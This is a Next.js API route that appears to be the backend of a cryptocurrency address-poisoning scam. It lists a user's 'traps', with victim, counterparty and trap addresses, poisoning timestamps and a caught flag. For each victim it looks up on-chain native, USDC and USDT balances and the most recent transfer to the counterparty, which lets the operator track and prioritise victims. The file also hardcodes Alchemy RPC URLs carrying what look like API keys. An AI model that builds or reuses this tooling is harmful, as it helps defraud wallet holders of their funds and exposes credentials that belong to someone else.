import { NextRequest, NextResponse } from 'next/server';
import { getAuthUser } from '@app-lib/auth';
import { createServerSupabaseClient } from '@app-lib/supabaseServer';
import { createClient } from '@supabase/supabase-js';
import { createPublicClient, http, formatEther, formatUnits, fallback } from 'viem';
import { mainnet, bsc, polygon } from 'viem/chains';

const chainMap = { ethereum: mainnet, bsc, polygon };
const chainIdMap: Record<string, number> = {
  ethereum: 1,
  bsc: 56,
  polygon: 137,
};

const tokenMap: Record<string, Record<string, string>> = {
  ethereum: {
    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  },
  bsc: {
    USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    USDT: '0x55d398326f99059fF775485246999027B3197955',
  },
  polygon: {
    USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
    USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  },
};

const tokenDecimalsMap: Record<string, Record<string, number>> = {
  ethereum: { USDC: 6, USDT: 6 },
  bsc: { USDC: 18, USDT: 18 },
  polygon: { USDC: 6, USDT: 6 },
};

const ERC20_ABI = [
  {
    constant: true,
    inputs: [{ name: 'owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: '', type: 'uint256' }],
    type: 'function',
  },
] as const;

// ─── Public RPC Fallbacks ───
const PUBLIC_FALLBACKS: Record<string, string[]> = {
  bsc: [
    'https://bsc-dataseed.binance.org',
    'https://rpc.ankr.com/bsc',
    'https://bsc.publicnode.com',
    'https://1rpc.io/bnb',
    'https://bsc.drpc.org',
    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
  ],
  polygon: [
    'https://polygon-rpc.com',
    'https://rpc.ankr.com/polygon',
    'https://polygon.llamarpc.com',
    'https://polygon.publicnode.com',
    'https://1rpc.io/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
  ],
  ethereum: [
    'https://ethereum.publicnode.com',
    'https://rpc.ankr.com/eth',
    'https://eth.llamarpc.com',
    'https://1rpc.io/eth',
    'https://eth.drpc.org',
    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
  ],
};

// ─── Block timestamp cache ───
const blockTimestampCache = new Map<string, number>(); // key: `${chainId}-${blockNumber}`
function getCachedBlockTimestamp(chainId: number, blockNumber: number): number | null {
  const key = `${chainId}-${blockNumber}`;
  return blockTimestampCache.get(key) || null;
}
function setCachedBlockTimestamp(chainId: number, blockNumber: number, timestamp: number) {
  const key = `${chainId}-${blockNumber}`;
  blockTimestampCache.set(key, timestamp);
}

// ─── Balance cache ───
const balanceCache = new Map<string, { native: string; tokens: Record<string, string>; timestamp: number }>();
const CACHE_TTL_MS = 60000;

function getCachedBalance(address: string) {
  const cached = balanceCache.get(address);
  if (cached && Date.now() - cached.timestamp < CACHE_TTL_MS) {
    return cached;
  }
  return null;
}

function setCachedBalance(address: string, native: string, tokens: Record<string, string>) {
  balanceCache.set(address, { native, tokens, timestamp: Date.now() });
}

export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  const { id } = await params;

  const user = await getAuthUser();
  if (!user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  const supabase = await createServerSupabaseClient();
  const supabaseAdmin = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!
  );

  const { data: campaign, error: campaignError } = await supabase
    .from('campaigns')
    .select('id, chain')
    .eq('id', id)
    .eq('user_id', user.id)
    .single();

  if (campaignError || !campaign) {
    return NextResponse.json({ error: 'Campaign not found' }, { status: 404 });
  }

  const chainId = chainIdMap[campaign.chain] || 1;

  const { searchParams } = new URL(req.url);
  const limit = parseInt(searchParams.get('limit') || '20', 10);
  const offset = parseInt(searchParams.get('offset') || '0', 10);

  const { data: traps, error: trapsError, count } = await supabase
    .from('traps')
    .select('id, victim_address, counterparty_address, trap_address, last_poisoned_at, is_caught, created_at, updated_at', { count: 'exact' })
    .eq('campaign_id', id)
    .order('created_at', { ascending: false })
    .range(offset, offset + limit - 1);

  if (trapsError) {
    return NextResponse.json({ error: trapsError.message }, { status: 500 });
  }

  // ─── RPC client ───
  const chain = chainMap[campaign.chain as keyof typeof chainMap];
  const rpcUrl = process.env[`${campaign.chain.toUpperCase()}_RPC_URL`] || process.env.NODE_RPC_URL;
  if (!rpcUrl) {
    console.warn('[traps] Missing RPC URL, skipping victim balances');
    return NextResponse.json({ traps, total: count, limit, offset });
  }

  const normalizedChain = campaign.chain?.toLowerCase() || '';
  const rawUrls = [rpcUrl, ...(PUBLIC_FALLBACKS[normalizedChain] || [])];
  const fallbackUrls = Array.from(new Set(rawUrls.filter(Boolean)));

  const client = createPublicClient({
    chain,
    transport: fallback(
      fallbackUrls.map(url => http(url, { timeout: 15000 })),
      { rank: false }
    ),
  });

  const tokenAddresses = tokenMap[campaign.chain as keyof typeof tokenMap] || {};
  const decimalsForChain = tokenDecimalsMap[campaign.chain as keyof typeof tokenDecimalsMap] || {};

  const enrichedTraps = [];
  for (const trap of traps) {
    const victim = trap.victim_address as `0x${string}`;
    let nativeBalance = '0';
    let tokenBalances: Record<string, string> = {};

    const cached = getCachedBalance(victim);
    if (cached) {
      nativeBalance = cached.native;
      tokenBalances = cached.tokens;
    } else {
      // Fetch balances...
      try {
        const balance = await client.getBalance({ address: victim });
        nativeBalance = formatEther(balance);
      } catch (e) {
        console.warn(`[traps] Native balance failed for ${victim}:`, e);
      }
      if (Object.keys(tokenAddresses).length > 0) {
        try {
          const contractCalls = Object.entries(tokenAddresses).map(([symbol, address]) => ({
            address: address as `0x${string}`,
            abi: ERC20_ABI as any,
            functionName: 'balanceOf',
            args: [victim],
          }));
          const results = await client.multicall({ contracts: contractCalls, allowFailure: true });
          results.forEach((result, i) => {
            const symbol = Object.keys(tokenAddresses)[i];
            if (result.status === 'success' && result.result) {
              const decimals = decimalsForChain[symbol] ?? 6;
              tokenBalances[symbol] = formatUnits(result.result as bigint, decimals);
            } else {
              tokenBalances[symbol] = '0';
            }
          });
        } catch (e) {
          console.warn(`[traps] Multicall failed for ${victim}:`, e);
          Object.keys(tokenAddresses).forEach((symbol) => { tokenBalances[symbol] = '0'; });
        }
      }
      setCachedBalance(victim, nativeBalance, tokenBalances);
    }

    // ─── Last transfer with block timestamp ───
    let lastTransferAt: string | null = null;
    if (trap.counterparty_address) {
      const victimLower = trap.victim_address.toLowerCase();
      const counterpartyLower = trap.counterparty_address.toLowerCase();

      // 1. Try exact match (victim → counterparty)
      const { data: exact, error: exactError } = await supabaseAdmin
        .from('token_transfers')
        .select('created_at, block_number')
        .ilike('sender', victimLower)
        .ilike('receiver', counterpartyLower)
        .eq('chain_id', chainId)
        .order('created_at', { ascending: false })
        .limit(1);

      let selectedRow = null;
      if (!exactError && exact && exact.length > 0) {
        selectedRow = exact[0];
        console.log(`[traps] Exact match found for ${trap.id}`);
      } else {
        // 2. Fallback: most recent transfer from victim to any address
        const { data: anyTransfer, error: anyError } = await supabaseAdmin
          .from('token_transfers')
          .select('created_at, block_number')
          .ilike('sender', victimLower)
          .eq('chain_id', chainId)
          .order('created_at', { ascending: false })
          .limit(1);

        if (!anyError && anyTransfer && anyTransfer.length > 0) {
          selectedRow = anyTransfer[0];
          console.log(`[traps] Fallback transfer found for ${trap.id}`);
        }
      }

      if (selectedRow) {
        const blockNumber = selectedRow.block_number;
        const createdAt = selectedRow.created_at;

        // Try to fetch block timestamp from RPC
        let timestamp = null;
        if (blockNumber) {
          const cached = getCachedBlockTimestamp(chainId, blockNumber);
          if (cached) {
            timestamp = cached;
          } else {
            try {
              const block = await client.getBlock({ blockNumber: BigInt(blockNumber) });
              if (block && block.timestamp) {
                timestamp = Number(block.timestamp) * 1000; // seconds to ms
                setCachedBlockTimestamp(chainId, blockNumber, timestamp);
                console.log(`[traps] Fetched block timestamp for block ${blockNumber}: ${new Date(timestamp).toISOString()}`);
              }
            } catch (e) {
              console.warn(`[traps] Could not fetch block timestamp for block ${blockNumber}:`, e);
            }
          }
        }

        // Use block timestamp if available, otherwise fallback to created_at
        if (timestamp) {
          lastTransferAt = new Date(timestamp).toISOString();
        } else {
          lastTransferAt = createdAt;
          console.log(`[traps] Using created_at as fallback for ${trap.id}`);
        }
      } else {
        console.log(`[traps] No transfers at all from ${victimLower} on chain ${chainId}`);
      }
    }

    enrichedTraps.push({
      ...trap,
      victim_balance: { native: nativeBalance, tokens: tokenBalances },
      last_transfer_at: lastTransferAt,
    });
  }

  return NextResponse.json({ traps: enrichedTraps, total: count, limit, offset });
}